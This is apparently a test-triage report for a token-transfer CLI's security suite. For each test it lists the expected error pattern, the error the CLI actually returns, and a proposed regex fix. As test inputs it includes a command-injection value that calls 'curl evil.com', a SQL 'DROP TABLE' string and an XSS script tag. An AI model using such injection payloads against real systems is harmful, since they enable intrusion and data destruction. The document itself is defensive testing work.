# Security Tests - Expected vs Actual Error Messages

This document shows side-by-side comparisons of what tests expect vs what they actually get.

---

## Test 1: HASH-006 RecipientDataHash Tampering

### What the Test Expects
```
Error message matching pattern:
  "TAMPERED|hash.*mismatch|recipientDataHash.*mismatch"

This pattern looks for any of:
- The word "TAMPERED"
- Something like "hash mismatch" or "hash verification mismatch"
- Something like "recipientDataHash mismatch"
```

### What the CLI Actually Returns
```
❌ Cryptographic proof verification failed:
  - SDK comprehensive verification error: Unsupported hash algorithm: 43981

Token has invalid cryptographic proofs - cannot accept this transfer.
```

### Analysis
✓ The tampering IS detected correctly
✓ The token IS rejected
✓ Error message is just more specific (identifies unsupported hash value)
✗ Pattern doesn't match "Unsupported hash algorithm"

### Fix Required
**Add to regex pattern**: `Unsupported hash algorithm`

**Updated Pattern**:
```
"TAMPERED|hash.*mismatch|recipientDataHash.*mismatch|Unsupported hash algorithm"
```

---

## Test 2: SEC-DBLSPEND-002 Idempotent Offline Receipt

### What the Test Expects
```
5 concurrent receive attempts
Expected result: All 5 should succeed (idempotent - same source, same dest)

Assertion expects: success_count = 5, failure_count = 0
```

### What Actually Happens
```
[INFO] Results: 0 succeeded, 0 failed

Test counts:
- success_count = 0
- failure_count = 0
- No exit code files created
```

### Analysis
⚠ Cannot determine what happened
- Output redirected to `/dev/null` (hidden)
- No visibility into errors
- Exit code files may not be created if process hangs
- Could be: process crash, timeout, or silent failure

### Investigation Needed
1. Enable debug output (capture stderr)
2. Add logging to each concurrent attempt
3. Check if protocol actually supports idempotent receives
4. Verify concurrent execution pattern works

### Recommended Fix
Add debug output to see actual errors:
```bash
# Before (silent):
>/dev/null 2>&1

# After (visible):
2>"${TEST_TEMP_DIR}/error-${i}.txt"
```

---

## Test 3: SEC-DBLSPEND-004 Cannot Receive Twice

### What the Test Expects
```
Error message matching pattern:
  "already.*submitted|duplicate.*submission"

Looking for one of:
- "already submitted"
- "duplicate submission"
- Similar variations
```

### What the CLI Actually Returns
```
❌ DOUBLE-SPEND PREVENTION - Transfer Rejected

The source token has already been spent (transferred elsewhere).

Details:
  - Current Owner: Unknown (transferred elsewhere)
  - On-Chain Status: SPENT

This can happen if:
  1. The sender created multiple transfers from the same token
  2. Another recipient already claimed this transfer
  3. The token was spent from another device/client

You cannot complete this transfer. Request a fresh token from the sender.
```

### Analysis
✓ The double-spend IS prevented
✓ The token IS correctly marked as spent
✓ User gets clear explanation
✗ Pattern doesn't match "already submitted"
✓ But DOES contain "already spent"

### Fix Required
**Add to regex pattern**: `already.*spent`

**Updated Pattern**:
```
"already.*submitted|duplicate.*submission|already.*spent"
```

---

## Test 4: SEC-AUTH-004 Replay Attack

### What the Test Expects
```
When Carol tries to receive a transfer that was modified to her address,
error should indicate: "signature verification failed"
```

### What the CLI Actually Returns
```
Step 6: Creating recipient predicate for new ownership state...
  ...
  ✓ Unmasked predicate created for new state
  Generated Address (unmasked): DIRECT://00009ce6f98a075...
  Intended Recipient:           DIRECT://00004ebe0377f3d...

❌ Error: Secret does not match intended recipient!

The transfer was sent to: DIRECT://00004ebe0377f3d...
Your secret generates:    DIRECT://00009ce6f98a075...
```

### Analysis
✓ The replay attack IS prevented
✓ Carol's secret doesn't match the transfer recipient
✓ Error is correct and informative
✗ Error catches at address validation layer (before signature check)
✓ Still prevents the attack, just different error path

### Security Implication
This is actually BETTER security:
1. Fail fast at address validation (cheaper operation)
2. Prevents unnecessary signature checking
3. Clearer error message about why it failed

### Fix Required
**Add to regex pattern**: Address validation errors

**Updated Pattern**:
```
"signature verification failed|address.*mismatch|Secret does not match intended recipient"
```

---

## Test 5: SEC-INPUT-004 Command Injection

### What the Test Expects
```
When sending to address: "DIRECT://$(curl evil.com)"
Error should contain: "invalid address format"
```

### What the CLI Actually Returns
```
❌ Validation Error: Invalid address: hex part contains non-hexadecimal characters

Hex part must contain only 0-9, a-f, A-F. Received: $(curl evil.com)
```

### Analysis
✓ The injection IS prevented (command not executed)
✓ The address IS rejected
✓ Error message is MORE SPECIFIC than generic "invalid format"
✗ Pattern doesn't match generic "invalid address format"
✓ But pattern IS still "Invalid address: ..."

### Fix Required
**Add to regex pattern**: Specific validation errors

**Updated Pattern**:
```
"invalid address format|hex.*non-hex|hex part contains non-hexadecimal"
```

---

## Test 6: SEC-INPUT-005 Negative Amount

### What the Test Expects
```
When passing: -1000000000000000000
Error should match:
  "negative.*amount.*not.*allowed" OR
  "amount.*must.*be.*non-negative" OR
  "negative.*amount"

All require "negative" before "amount"
```

### What the CLI Actually Returns
```
❌ Error: Coin amount cannot be negative
  Provided: -1000000000000000000
```

### Analysis
✓ The validation IS working
✓ Negative amounts ARE rejected
✓ Error message clearly states "cannot be negative"
✗ But regex requires "negative.*amount" pattern
✓ Message has "cannot be negative" instead

### Regex Issue
Message contains:
- "Coin" (prefix)
- "amount"
- "cannot be"
- "negative"

Pattern requires:
- "negative" (comes first)
- ".*amount" (far apart allowed)

Actual words are ordered differently: "amount...cannot be...negative"

### Fix Required
**Add exact phrase to pattern**:

**Updated Pattern**:
```
"negative.*amount.*not.*allowed|amount.*must.*be.*non-negative|negative.*amount|cannot be negative"
```

---

## Test 7: SEC-INPUT-007 Special Characters

### What the Test Expects
```
For all 5 sub-tests:
Error should contain: "invalid address format"
```

### What the CLI Actually Returns
```
For SQL injection "'; DROP TABLE tokens;--":
❌ Validation Error: Invalid address format: must start with "DIRECT://"

For XSS "<script>alert(1)</script>":
❌ Validation Error: Invalid address format: must start with "DIRECT://"

For null bytes "DIRECT://\x00\x00\x00":
❌ Validation Error: Invalid address format: must start with "DIRECT://"

For empty "":
❌ Validation Error: Invalid address format: must start with "DIRECT://"

For invalid "invalidaddress":
❌ Validation Error: Invalid address format: must start with "DIRECT://"
```

### Analysis
✓ ALL special characters ARE being rejected
✓ Validation IS working correctly
✓ Error messages ARE correct
? Possible case sensitivity issue

### Possible Issues

**Issue 1: Case Sensitivity**
- Test looks for: `invalid address format` (lowercase)
- CLI returns: `Invalid address format` (capital I)

**Issue 2: Exact Matching**
- Test looks for exact phrase
- CLI returns phrase with additional details

### Fix Required
**Option A - Case Insensitive Matching**:
```bash
assert_output_contains "[Ii]nvalid address format"
```

**Option B - Multiple Patterns**:
```bash
assert_output_contains "invalid address format|Invalid address format"
```

**Option C - Investigate Assertion Function**
Check if `assert_output_contains` is case-sensitive:
```bash
grep -A 5 "assert_output_contains()" tests/helpers/assertions.bash
```

---

## Summary Table

| Test | Expected Pattern | Actual Error | Fix |
|------|------------------|--------------|-----|
| HASH-006 | hash mismatch | Unsupported hash algorithm | Add SDK error pattern |
| DBLSPEND-002 | 5 successes | 0 detected (silent) | Enable debug output |
| DBLSPEND-004 | already submitted | already spent | Add spent pattern |
| AUTH-004 | signature failed | address mismatch | Add address pattern |
| INPUT-004 | invalid format | hex non-hex chars | Add specific pattern |
| INPUT-005 | negative.*amount | cannot be negative | Add exact phrase |
| INPUT-007 | invalid address | Invalid address | Case/exact matching |

---

## Common Pattern: Error Message Specificity

Most failures follow the same pattern:

```
Test Assumption: Error should be generic/brief
Actual Behavior: Error is specific/detailed

Example:
  Expected: "invalid address format"
  Actual:   "Invalid address format: hex part contains non-hexadecimal characters"

Result: More informative but doesn't match test pattern
```

This is actually GOOD behavior for UX and debugging. The tests should capture these specific messages.

---

## CLI Error Message Quality

Analysis shows the CLI error messages are actually EXCELLENT:

1. **Specific**: Identify exact problem, not just generic "invalid"
2. **Actionable**: Explain what's wrong and what was received
3. **Educational**: Help user understand the requirement
4. **Hierarchical**: Top-level error summary + details

Example:
```
❌ Error: Coin amount cannot be negative
  Provided: -1000000000000000000

(vs)

❌ Error: Invalid input

The second is less helpful.
```

---

## Recommendation

Rather than making error messages more generic to match tests, update tests to capture the specific, helpful error messages being returned.

This ensures:
- Tests validate actual behavior
- Error messages remain helpful
- Tests are more maintainable (specific patterns less likely to change)

